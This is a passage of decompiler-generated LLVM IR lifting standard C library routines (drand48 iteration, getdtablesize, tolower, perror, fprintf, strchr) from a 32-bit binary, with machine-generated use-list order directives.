  %v1_100170a0 = inttoptr i32 %v0_1001709c to i16*
  %v2_100170a0 = call i32 @__GI_fclose(i16* %v1_100170a0)
  br label %dec_label_pc_100170ac

dec_label_pc_100170a8:                            ; preds = %dec_label_pc_10016e60, %dec_label_pc_10016e30, %dec_label_pc_10016e28, %dec_label_pc_10016e1c, %dec_label_pc_10016e0c, %dec_label_pc_10016df4, %dec_label_pc_10016de4
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_100170ac

dec_label_pc_100170ac:                            ; preds = %dec_label_pc_10017094, %dec_label_pc_1001709c, %dec_label_pc_10016e8c, %dec_label_pc_100170a8
  store i32 %v0_10016da8, i32* %r0.global-to-local, align 4
  %v0_100170b0 = load i32, i32* @r26, align 4
  ret i32 %v0_100170b0

; uselistorder directives
  uselistorder i32 %v0_10017024, { 1, 0 }
  uselistorder i32 %v1_10017018, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10016fcc, { 1, 0 }
  uselistorder i32 %v0_10016fc8, { 1, 0 }
  uselistorder i32 %v0_10016f582, { 1, 0 }
  uselistorder i32 %v1_10016fa0, { 1, 0 }
  uselistorder i32 %v1_10016fa015, { 1, 0 }
  uselistorder i32 %v1_10016f84, { 1, 0 }
  uselistorder i32 %v0_10016f7c, { 1, 0, 2 }
  uselistorder i32 %v1_10016f60, { 1, 0 }
  uselistorder i32 %v2_10016f2c, { 1, 0 }
  uselistorder i32 %v0_10016e1c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10016df4.pr, { 1, 0, 2 }
  uselistorder i32 %v1_10016dc0, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r15.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 13, 0, 14, 29, 21, 15, 16, 30, 17, 18, 20, 19, 1, 22, 23, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 24, 25, 26, 27, 28 }
  uselistorder i32 34, { 7, 8, 4, 5, 0, 1, 6, 9, 10, 11, 2, 3 }
  uselistorder i32 (i16*)* @__GI_fclose, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 3, 2, 4, 1, 0 }
  uselistorder i32 10, { 9, 30, 31, 32, 33, 34, 35, 36, 20, 21, 17, 18, 19, 38, 37, 39, 40, 5, 41, 2, 43, 3, 44, 1, 6, 10, 47, 11, 26, 12, 27, 23, 7, 4, 29, 42, 45, 46, 22, 13, 0, 8, 24, 25, 14, 28, 15, 16 }
  uselistorder i32 (i32, i32)* @__GI_strcasecmp, { 0, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 1, 2, 3, 4, 0 }
  uselistorder i32 6, { 20, 21, 22, 23, 24, 12, 13, 14, 15, 6, 7, 29, 16, 0, 1, 2, 17, 8, 3, 25, 26, 4, 27, 9, 28, 5, 10, 11, 18, 19 }
  uselistorder i32* @global_var_1002efac, { 0, 3, 1, 4, 5, 2, 6, 7 }
  uselistorder i32 35, { 1, 3, 2, 4, 0 }
  uselistorder i32 ()* @__errno_location, { 66, 118, 117, 116, 65, 42, 40, 60, 38, 37, 29, 114, 63, 123, 122, 121, 120, 33, 115, 36, 47, 24, 23, 22, 75, 74, 28, 31, 30, 9, 68, 67, 46, 45, 113, 112, 111, 25, 26, 104, 14, 81, 62, 4, 3, 27, 35, 43, 1, 58, 57, 72, 71, 69, 17, 70, 44, 13, 12, 11, 85, 61, 21, 92, 89, 88, 93, 91, 59, 64, 73, 110, 8, 20, 97, 109, 108, 48, 39, 10, 34, 84, 80, 41, 5, 107, 56, 32, 16, 7, 6, 2, 106, 105, 103, 19, 18, 102, 101, 100, 99, 98, 55, 54, 53, 52, 51, 50, 49, 124, 96, 119, 95, 94, 0, 15, 90, 87, 86, 83, 82, 79, 78, 77, 76 }
  uselistorder i32* @r21, { 6, 7, 5, 8, 9, 10, 11, 12, 13, 14, 15, 0, 1, 2, 3, 16, 17, 18, 19, 4 }
  uselistorder i32* @r22, { 8, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 22, 23, 0, 1, 2, 3, 20, 21, 4 }
  uselistorder i32 80, { 5, 12, 4, 3, 2, 1, 11, 9, 8, 0, 6, 7, 10 }
  uselistorder i32 48, { 17, 10, 11, 12, 1, 13, 14, 4, 8, 9, 19, 20, 2, 21, 22, 23, 6, 24, 5, 25, 3, 0, 26, 27, 18, 16, 7, 28, 29, 15 }
  uselistorder i32 36, { 9, 10, 11, 12, 13, 14, 15, 16, 5, 6, 3, 20, 1, 2, 17, 18, 19, 7, 4, 8, 0 }
  uselistorder i32 -48, { 2, 4, 3, 5, 0, 1, 6 }
  uselistorder i32* @r27, { 34, 35, 36, 37, 38, 39, 1, 40, 41, 42, 43, 13, 14, 7, 15, 3, 2, 44, 45, 46, 47, 16, 17, 18, 19, 113, 114, 98, 99, 115, 116, 117, 118, 119, 48, 0, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 100, 101, 102, 20, 21, 22, 23, 24, 25, 105, 106, 107, 108, 109, 110, 111, 112, 79, 80, 120, 4, 121, 8, 127, 132, 122, 126, 59, 60, 61, 62, 128, 129, 130, 103, 104, 63, 64, 65, 81, 82, 5, 83, 84, 85, 86, 9, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 10, 11, 12, 131, 66, 67, 68, 69, 77, 78, 70, 71, 72, 73, 33, 6, 123, 124, 125, 26, 27, 28, 29, 30, 31, 32, 74, 75, 76 }
  uselistorder i32 -32, { 2, 3, 0, 1 }
  uselistorder i32 32, { 66, 67, 68, 27, 69, 70, 28, 92, 89, 46, 23, 24, 20, 71, 72, 47, 48, 49, 52, 1, 50, 2, 51, 53, 54, 37, 38, 39, 40, 3, 41, 42, 91, 78, 29, 26, 79, 90, 21, 22, 64, 65, 95, 4, 5, 6, 17, 73, 74, 75, 80, 81, 30, 82, 83, 84, 85, 86, 87, 88, 0, 93, 94, 76, 62, 18, 31, 19, 16, 25, 7, 55, 56, 43, 44, 35, 36, 77, 57, 58, 59, 60, 45, 61, 96, 97, 63, 9, 10, 8, 12, 11, 32, 33, 14, 15, 13, 34 }
  uselistorder i32* @r16, { 0, 4, 5, 6, 1, 7, 2, 3 }
  uselistorder i32* @r17, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* @r18, { 4, 5, 6, 7, 8, 1, 9, 10, 0, 11, 2, 3 }
  uselistorder i32* @r19, { 4, 2, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 15, 16, 1 }
  uselistorder i32* @r20, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 1 }
  uselistorder i32 %arg6, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_100170ac, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1001707c, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_10017078, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10017034, { 1, 0 }
  uselistorder label %dec_label_pc_1001702c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10017008, { 1, 0 }
  uselistorder label %dec_label_pc_10016fc8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10016f58.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10016fa8, { 1, 0 }
  uselistorder label %dec_label_pc_10016f40, { 1, 0 }
  uselistorder label %dec_label_pc_10016f14, { 1, 0 }
  uselistorder label %dec_label_pc_10016ef8, { 1, 0 }
  uselistorder label %dec_label_pc_10016e60, { 1, 0 }
  uselistorder label %dec_label_pc_10016df4, { 1, 0 }
}

define i32 @__drand48_iterate() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_100170c4 = load i32, i32* @r4, align 4
  %v1_100170c4 = add i32 %v0_100170c4, 14
  %v2_100170c4 = inttoptr i32 %v1_100170c4 to i16*
  %v3_100170c4 = load i16, i16* %v2_100170c4, align 2
  %v4_100170c4 = zext i16 %v3_100170c4 to i32
  store i32 %v4_100170c4, i32* %r0.global-to-local, align 4
  %v3_100170cc = icmp eq i16 %v3_100170c4, 0
  %v0_100170d4 = load i32, i32* @r3, align 4
  store i32 %v0_100170d4, i32* %r31.global-to-local, align 4
  br i1 %v3_100170cc, label %dec_label_pc_100170dc, label %dec_label_pc_10017100

dec_label_pc_100170dc:                            ; preds = %entry
  store i32 5, i32* %r9.global-to-local, align 4
  store i32 -554899859, i32* %r10.global-to-local, align 4
  %v3_100170ec = add i32 %v0_100170c4, 12
  %v4_100170ec = inttoptr i32 %v3_100170ec to i16*
  store i16 11, i16* %v4_100170ec, align 2
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_100170f4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100170f4 = load i32, i32* @r4, align 4
  %v2_100170f4 = add i32 %v1_100170f4, 16
  %v3_100170f4 = inttoptr i32 %v2_100170f4 to i32*
  store i32 %v0_100170f4, i32* %v3_100170f4, align 4
  %v0_100170f8 = load i32, i32* %r10.global-to-local, align 4
  %v1_100170f8 = load i32, i32* @r4, align 4
  %v2_100170f8 = add i32 %v1_100170f8, 20
  %v3_100170f8 = inttoptr i32 %v2_100170f8 to i32*
  store i32 %v0_100170f8, i32* %v3_100170f8, align 4
  %v0_100170fc = load i32, i32* %r0.global-to-local, align 4
  %v1_100170fc = trunc i32 %v0_100170fc to i16
  %v2_100170fc = load i32, i32* @r4, align 4
  %v3_100170fc = add i32 %v2_100170fc, 14
  %v4_100170fc = inttoptr i32 %v3_100170fc to i16*
  store i16 %v1_100170fc, i16* %v4_100170fc, align 2
  %v0_10017100.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10017120.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10017100

dec_label_pc_10017100:                            ; preds = %entry, %dec_label_pc_100170dc
  %v0_10017140 = phi i32 [ %v0_100170c4, %entry ], [ %v0_10017120.pre, %dec_label_pc_100170dc ]
  %v2_10017164 = phi i32 [ %v0_100170d4, %entry ], [ %v0_10017100.pre, %dec_label_pc_100170dc ]
  %v1_10017100 = add i32 %v2_10017164, 4
  %v2_10017100 = inttoptr i32 %v1_10017100 to i16*
  %v3_10017100 = load i16, i16* %v2_10017100, align 2
  %v4_10017100 = zext i16 %v3_10017100 to i32
  store i32 %v4_10017100, i32* %r10.global-to-local, align 4
  %v1_10017108 = add i32 %v2_10017164, 2
  %v2_10017108 = inttoptr i32 %v1_10017108 to i16*
  %v3_10017108 = load i16, i16* %v2_10017108, align 2
  %v4_10017108 = zext i16 %v3_10017108 to i32
  store i32 %v4_10017108, i32* %r7.global-to-local, align 4
  %v1_10017110 = inttoptr i32 %v2_10017164 to i16*
  %v2_10017110 = load i16, i16* %v1_10017110, align 2
  %v3_10017110 = zext i16 %v2_10017110 to i32
  store i32 %v4_10017100, i32* %r9.global-to-local, align 4
  %v1_10017118 = mul nuw i32 %v4_10017108, 65536
  store i32 %v1_10017118, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v1_10017120 = add i32 %v0_10017140, 20
  %v2_10017120 = inttoptr i32 %v1_10017120 to i32*
  %v3_10017120 = load i32, i32* %v2_10017120, align 4
  store i32 %v3_10017110, i32* %r10.global-to-local, align 4
  %v1_10017128 = add i32 %v0_10017140, 16
  %v2_10017128 = inttoptr i32 %v1_10017128 to i32*
  %v3_10017128 = load i32, i32* %v2_10017128, align 4
  %v2_10017134 = or i32 %v3_10017110, %v1_10017118
  store i32 %v4_10017100, i32* %r7.global-to-local, align 4
  %v2_1001713c = mul i32 %v3_10017128, %v2_10017134
  %v1_10017140 = add i32 %v0_10017140, 12
  %v2_10017140 = inttoptr i32 %v1_10017140 to i16*
  %v3_10017140 = load i16, i16* %v2_10017140, align 2
  %v4_10017140 = zext i16 %v3_10017140 to i32
  %v2_10017144 = mul i32 %v3_10017120, %v4_10017100
  %v2_10017148 = zext i32 %v2_10017134 to i64
  %v3_10017148 = zext i32 %v3_10017120 to i64
  %v4_10017148 = mul nuw i64 %v3_10017148, %v2_10017148
  %v5_10017148 = udiv i64 %v4_10017148, 4294967296
  %v6_10017148 = trunc i64 %v5_10017148 to i32
  %v2_1001714c = add i32 %v2_1001713c, %v2_10017144
  %v2_10017150 = mul i32 %v3_10017120, %v2_10017134
  %v2_10017154 = add i32 %v2_1001714c, %v6_10017148
  store i32 %v2_10017154, i32* %r9.global-to-local, align 4
  %v2_10017158 = add i32 %v4_10017140, %v2_10017150
  store i32 %v2_10017158, i32* @r8, align 4
  %v3_10017158 = icmp ult i32 %v2_10017158, %v2_10017150
  %v4_1001715c = zext i1 %v3_10017158 to i32
  %v5_1001715c = add i32 %v4_1001715c, %v2_10017154
  store i32 %v5_1001715c, i32* %r7.global-to-local, align 4
  %v1_10017160 = mul i32 %v5_1001715c, 65536
  store i32 %v1_10017160, i32* %r0.global-to-local, align 4
  %v1_10017164 = trunc i32 %v2_10017158 to i16
  store i16 %v1_10017164, i16* %v1_10017110, align 2
  %v0_10017168 = load i32, i32* @r8, align 4
  %v1_10017168 = udiv i32 %v0_10017168, 65536
  %v0_1001716c = load i32, i32* %r7.global-to-local, align 4
  %v0_10017170 = load i32, i32* %r0.global-to-local, align 4
  %v2_10017170 = or i32 %v0_10017170, %v1_10017168
  store i32 %v2_10017170, i32* @r10, align 4
  %v1_10017174 = trunc i32 %v0_1001716c to i16
  %v2_10017174 = load i32, i32* %r31.global-to-local, align 4
  %v3_10017174 = add i32 %v2_10017174, 4
  %v4_10017174 = inttoptr i32 %v3_10017174 to i16*
  store i16 %v1_10017174, i16* %v4_10017174, align 2
  %v0_10017178 = load i32, i32* @r10, align 4
  %v1_10017178 = trunc i32 %v0_10017178 to i16
  %v2_10017178 = load i32, i32* %r31.global-to-local, align 4
  %v3_10017178 = add i32 %v2_10017178, 2
  %v4_10017178 = inttoptr i32 %v3_10017178 to i16*
  store i16 %v1_10017178, i16* %v4_10017178, align 2
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10017150, { 1, 0 }
  uselistorder i32 %v2_10017134, { 0, 2, 1 }
  uselistorder i32 %v3_10017120, { 0, 2, 1 }
  uselistorder i32 %v1_10017118, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32 20, { 72, 73, 53, 54, 55, 27, 4, 56, 1, 74, 26, 79, 77, 15, 16, 17, 18, 19, 20, 21, 22, 78, 28, 29, 30, 31, 32, 33, 34, 23, 35, 36, 37, 38, 39, 57, 58, 62, 63, 75, 76, 40, 41, 50, 42, 0, 83, 84, 64, 65, 66, 67, 68, 70, 71, 69, 81, 59, 49, 80, 60, 11, 12, 13, 14, 24, 25, 43, 44, 45, 46, 47, 48, 61, 82, 5, 51, 6, 3, 2, 7, 52, 8, 9, 10 }
  uselistorder i32 16, { 146, 147, 94, 25, 95, 96, 26, 97, 98, 4, 99, 100, 5, 101, 27, 52, 148, 164, 28, 29, 18, 49, 149, 6, 7, 44, 45, 46, 47, 120, 121, 150, 151, 48, 8, 9, 0, 158, 102, 103, 104, 39, 40, 159, 50, 51, 53, 54, 160, 55, 56, 30, 57, 58, 59, 161, 31, 41, 42, 162, 163, 60, 61, 62, 63, 64, 65, 167, 122, 123, 124, 125, 132, 133, 134, 135, 136, 137, 138, 152, 153, 154, 155, 156, 157, 168, 139, 15, 89, 66, 86, 67, 19, 105, 106, 10, 92, 16, 93, 184, 185, 186, 187, 107, 108, 109, 110, 111, 112, 126, 127, 113, 114, 115, 140, 141, 142, 143, 144, 145, 169, 170, 171, 128, 11, 129, 130, 82, 165, 32, 68, 69, 70, 71, 172, 173, 174, 175, 180, 181, 182, 183, 176, 177, 178, 17, 72, 73, 131, 1, 2, 12, 37, 13, 20, 38, 14, 74, 75, 179, 3, 76, 77, 78, 79, 80, 81, 43, 166, 83, 33, 84, 85, 21, 34, 22, 87, 23, 88, 24, 90, 91, 116, 117, 118, 35, 119, 36 }
  uselistorder i32 5, { 34, 30, 31, 19, 20, 21, 7, 8, 35, 9, 10, 11, 22, 2, 3, 18, 23, 24, 1, 25, 26, 6, 4, 32, 33, 27, 28, 29, 12, 5, 13, 14, 15, 16, 17, 0 }
  uselistorder i16 0, { 20, 18, 0, 13, 21, 14, 1, 2, 3, 4, 5, 6, 22, 24, 23, 25, 15, 26, 19, 16, 7, 8, 9, 10, 11, 12, 17, 27, 28 }
  uselistorder label %dec_label_pc_10017100, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_10017194 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268530080, i32* @lr, align 4
  %v2_1001719c = call i32 @getrlimit(i32 7, i32 %v2_10017194)
  %v1_100171a0 = icmp slt i32 %v2_1001719c, 0
  br i1 %v1_100171a0, label %dec_label_pc_100171b0, label %dec_label_pc_100171ac

dec_label_pc_100171ac:                            ; preds = %entry
  %v3_100171ac = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_100171b0

dec_label_pc_100171b0:                            ; preds = %entry, %dec_label_pc_100171ac
  %v0_100171bc = phi i32 [ 256, %entry ], [ %v3_100171ac, %dec_label_pc_100171ac ]
  ret i32 %v0_100171bc

; uselistorder directives
  uselistorder i32 (i32, i32)* @getrlimit, { 1, 0 }
  uselistorder i32 7, { 2, 13, 14, 20, 5, 0, 3, 16, 17, 18, 19, 1, 6, 7, 8, 9, 10, 11, 12, 15, 4 }
  uselistorder label %dec_label_pc_100171b0, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  %v1_100171c0 = add i32 %arg1, 128
  %v1_100171c4 = mul i32 %arg1, 2
  %v2_100171c8 = icmp ugt i32 %v1_100171c0, 383
  %v0_100171cc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_100171c8, i32 %v0_100171cc)
  %v3_100171d4 = load i32, i32* bitcast (i32** @global_var_1002efb4.418 to i32*), align 4
  %v2_100171d8 = add i32 %v1_100171c4, %v3_100171d4
  %v3_100171d8 = inttoptr i32 %v2_100171d8 to i16*
  %v4_100171d8 = load i16, i16* %v3_100171d8, align 2
  %v5_100171d8 = sext i16 %v4_100171d8 to i32
  ret i32 %v5_100171d8

; uselistorder directives
  uselistorder i32 128, { 18, 0, 1, 28, 4, 5, 6, 20, 30, 7, 8, 9, 10, 31, 32, 29, 19, 22, 23, 24, 11, 25, 26, 27, 2, 14, 17, 21, 15, 12, 13, 3, 16 }
}

define i32 @perror() local_unnamed_addr {
entry:
  %v0_100171e0 = load i32, i32* @r3, align 4
  %v3_100171e0 = icmp eq i32 %v0_100171e0, 0
  br i1 %v3_100171e0, label %dec_label_pc_10017208, label %dec_label_pc_100171f0

dec_label_pc_100171f0:                            ; preds = %entry
  %v1_100171f0 = inttoptr i32 %v0_100171e0 to i8*
  %v2_100171f0 = load i8, i8* %v1_100171f0, align 1
  %v3_100171f4 = icmp eq i8 %v2_100171f0, 0
  br i1 %v3_100171f4, label %dec_label_pc_10017208, label %dec_label_pc_100171fc

dec_label_pc_100171fc:                            ; preds = %dec_label_pc_100171f0
  br label %dec_label_pc_1001720c

dec_label_pc_10017208:                            ; preds = %dec_label_pc_100171f0, %entry
  br label %dec_label_pc_1001720c

dec_label_pc_1001720c:                            ; preds = %dec_label_pc_100171fc, %dec_label_pc_10017208
  %v3_10017214 = load i32, i32* @global_var_1002ef8c, align 4
  store i32 %v3_10017214, i32* @r3, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1001a1fc.619 to i32), i32* @r4, align 4
  %v4_10017220 = call i32 @fprintf(i32 %v3_10017214, i32 ptrtoint ([8 x i8]* @global_var_1001a1fc.619 to i32), i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  ret i32 %v4_10017220

; uselistorder directives
  uselistorder label %dec_label_pc_1001720c, { 1, 0 }
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %v2_10017230 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10017230, i32* @r5, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_10017288 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_10017288, i32* %stack_var_-96, align 4
  store i32 268530324, i32* @lr, align 4
  %v0_10017290 = call i32 @__GI_vfprintf()
  ret i32 %v0_10017290
}

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_100172a4 = urem i32 %arg1, 256
  store i32 %v1_100172a4, i32* %r4.global-to-local, align 4
  %v0_100172c42 = load i32, i32* @r3, align 4
  %v1_100172c43 = urem i32 %v0_100172c42, 4
  %v3_100172c45 = icmp eq i32 %v1_100172c43, 0
  br i1 %v3_100172c45, label %dec_label_pc_100172cc, label %dec_label_pc_100172ac

dec_label_pc_100172ac:                            ; preds = %entry, %dec_label_pc_100172c0
  %v1_100172b0 = phi i32 [ %v0_100172cc.pre, %dec_label_pc_100172c0 ], [ %v1_100172a4, %entry ]
  %v0_100172ac = phi i32 [ %v1_100172c0, %dec_label_pc_100172c0 ], [ %v0_100172c42, %entry ]
  %v1_100172ac = inttoptr i32 %v0_100172ac to i8*
  %v2_100172ac = load i8, i8* %v1_100172ac, align 1
  %v3_100172ac = zext i8 %v2_100172ac to i32
  %v4_100172b0 = icmp eq i32 %v3_100172ac, %v1_100172b0
  %v3_100172b4 = icmp eq i8 %v2_100172ac, 0
  %v0_100172b8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_100172b0, i32 %v0_100172b8)
  br i1 %v3_100172b4, label %dec_label_pc_1001739c, label %dec_label_pc_100172c0

dec_label_pc_100172c0:                            ; preds = %dec_label_pc_100172ac
  %v0_100172c0 = load i32, i32* @r3, align 4
  %v1_100172c0 = add i32 %v0_100172c0, 1
  store i32 %v1_100172c0, i32* @r3, align 4
  %v1_100172c4 = urem i32 %v1_100172c0, 4
  %v3_100172c4 = icmp eq i32 %v1_100172c4, 0
  %v0_100172cc.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_100172c4, label %dec_label_pc_100172cc, label %dec_label_pc_100172ac

dec_label_pc_100172cc:                            ; preds = %dec_label_pc_100172c0, %entry
  %v0_100172e410 = phi i32 [ %v0_100172c42, %entry ], [ %v1_100172c0, %dec_label_pc_100172c0 ]
  %v0_100172cc = phi i32 [ %v1_100172a4, %entry ], [ %v0_100172cc.pre, %dec_label_pc_100172c0 ]
  %v1_100172cc = mul i32 %v0_100172cc, 256
  %v2_100172d4 = or i32 %v1_100172cc, %v0_100172cc
  %v1_100172dc = mul i32 %v2_100172d4, 65536
  %v2_100172e0 = or i32 %v1_100172dc, %v2_100172d4
  br label %dec_label_pc_100172e4

dec_label_pc_100172e4:                            ; preds = %dec_label_pc_100172e4, %dec_label_pc_10017398, %dec_label_pc_100172cc
  %v0_1001733c = phi i32 [ %v0_100172e410, %dec_label_pc_100172cc ], [ %v1_100172e8, %dec_label_pc_10017398 ], [ %v1_100172e8, %dec_label_pc_100172e4 ]
  %v1_100172e4 = inttoptr i32 %v0_1001733c to i32*
  %v2_100172e4 = load i32, i32* %v1_100172e4, align 4
  %v1_100172e8 = add i32 %v0_1001733c, 4
  %v2_100172f0 = xor i32 %v2_100172e4, %v2_100172e0
  %v1_100172f4 = add i32 %v2_100172e4, 2130640639
  %v2_100172fc = xor i32 %v1_100172f4, %v2_100172e4
  %v1_10017300 = add i32 %v2_100172f0, 2130640639
  %v2_10017304 = and i32 %v2_100172fc, -2130640640
  %v3_10017304 = xor i32 %v2_10017304, -2130640640
  %v2_10017308 = xor i32 %v1_10017300, %v2_100172f0
  %v2_1001730c = and i32 %v2_10017308, -2130640640
  %v3_1001730c = xor i32 %v2_1001730c, -2130640640
  %v1_10017318 = add i32 %v0_1001733c, 1
  %tmp = or i32 %v3_1001730c, %v3_10017304
  %brmerge = icmp eq i32 %tmp, 0
  br i1 %brmerge, label %dec_label_pc_100172e4, label %dec_label_pc_10017324

dec_label_pc_10017324:                            ; preds = %dec_label_pc_100172e4
  %v2_10017324 = inttoptr i32 %v0_1001733c to i8*
  %v3_10017324 = load i8, i8* %v2_10017324, align 1
  %v4_10017324 = zext i8 %v3_10017324 to i32
  %v1_10017328 = add i32 %v0_1001733c, 2
  store i32 %v1_10017328, i32* @r10, align 4
  %v1_1001732c = add i32 %v0_1001733c, 3
  store i32 %v1_1001732c, i32* @r8, align 4
  %v4_10017330 = icmp eq i32 %v4_10017324, %v0_100172cc
  br i1 %v4_10017330, label %dec_label_pc_1001733c, label %dec_label_pc_10017344

dec_label_pc_1001733c:                            ; preds = %dec_label_pc_10017324
  ret i32 %v0_1001733c

dec_label_pc_10017344:                            ; preds = %dec_label_pc_10017324
  %v3_10017334 = icmp eq i8 %v3_10017324, 0
  br i1 %v3_10017334, label %dec_label_pc_1001739c, label %dec_label_pc_10017348

dec_label_pc_10017348:                            ; preds = %dec_label_pc_10017344
  %v2_10017348 = inttoptr i32 %v1_10017318 to i8*
  %v3_10017348 = load i8, i8* %v2_10017348, align 1
  %v4_10017348 = zext i8 %v3_10017348 to i32
  %v4_1001734c = icmp eq i32 %v4_10017348, %v0_100172cc
  br i1 %v4_1001734c, label %dec_label_pc_10017358, label %dec_label_pc_10017360

dec_label_pc_10017358:                            ; preds = %dec_label_pc_10017348
  ret i32 %v1_10017318

dec_label_pc_10017360:                            ; preds = %dec_label_pc_10017348
  %v3_10017350 = icmp eq i8 %v3_10017348, 0
  br i1 %v3_10017350, label %dec_label_pc_1001739c, label %dec_label_pc_10017364

dec_label_pc_10017364:                            ; preds = %dec_label_pc_10017360
  %v2_10017364 = inttoptr i32 %v1_10017328 to i8*
  %v3_10017364 = load i8, i8* %v2_10017364, align 1
  %v4_10017364 = zext i8 %v3_10017364 to i32
  %v4_10017368 = icmp eq i32 %v4_10017364, %v0_100172cc
  br i1 %v4_10017368, label %dec_label_pc_10017374, label %dec_label_pc_1001737c

dec_label_pc_10017374:                            ; preds = %dec_label_pc_10017364
  ret i32 %v1_10017328

dec_label_pc_1001737c:                            ; preds = %dec_label_pc_10017364
  %v3_1001736c = icmp eq i8 %v3_10017364, 0
  br i1 %v3_1001736c, label %dec_label_pc_1001739c, label %dec_label_pc_10017380

dec_label_pc_10017380:                            ; preds = %dec_label_pc_1001737c
  %v2_10017380 = inttoptr i32 %v1_1001732c to i8*
  %v3_10017380 = load i8, i8* %v2_10017380, align 1
  %v4_10017380 = zext i8 %v3_10017380 to i32
  %v4_10017384 = icmp eq i32 %v4_10017380, %v0_100172cc
  br i1 %v4_10017384, label %dec_label_pc_10017390, label %dec_label_pc_10017398

dec_label_pc_10017390:                            ; preds = %dec_label_pc_10017380
  ret i32 %v1_1001732c

dec_label_pc_10017398:                            ; preds = %dec_label_pc_10017380
  %v3_10017388 = icmp eq i8 %v3_10017380, 0
  br i1 %v3_10017388, label %dec_label_pc_1001739c, label %dec_label_pc_100172e4

dec_label_pc_1001739c:                            ; preds = %dec_label_pc_100172ac, %dec_label_pc_10017398, %dec_label_pc_1001737c, %dec_label_pc_10017360, %dec_label_pc_10017344
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_100172e8, { 1, 0 }
  uselistorder i32 %v2_100172e4, { 0, 2, 1 }
  uselistorder i32 %v0_1001733c, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_100172d4, { 1, 0 }
  uselistorder i32 %v0_100172cc, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_100172c0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_100172c42, { 2, 1, 0 }
  uselistorder i32 %v1_100172a4, { 1, 2, 0 }
  uselistorder i32* @r8, { 49, 127, 128, 17, 50, 51, 52, 53, 54, 55, 56, 57, 7, 58, 59, 60, 18, 27, 28, 129, 139, 26, 61, 62, 63, 38, 130, 131, 132, 140, 25, 3, 8, 143, 141, 142, 31, 4, 32, 16, 64, 19, 65, 66, 29, 136, 137, 30, 138, 20, 9, 133, 134, 67, 68, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 40, 5, 41, 10, 42, 44, 45, 0, 46, 11, 47, 48, 12, 43, 73, 74, 75, 33, 34, 144, 21, 22, 23, 151, 152, 108, 69, 70, 71, 72, 135, 109, 110, 111, 112, 113, 114, 115, 13, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 1, 126, 35, 145, 146, 2, 147, 6, 14, 15, 149, 148, 150, 36, 37, 24, 39 }
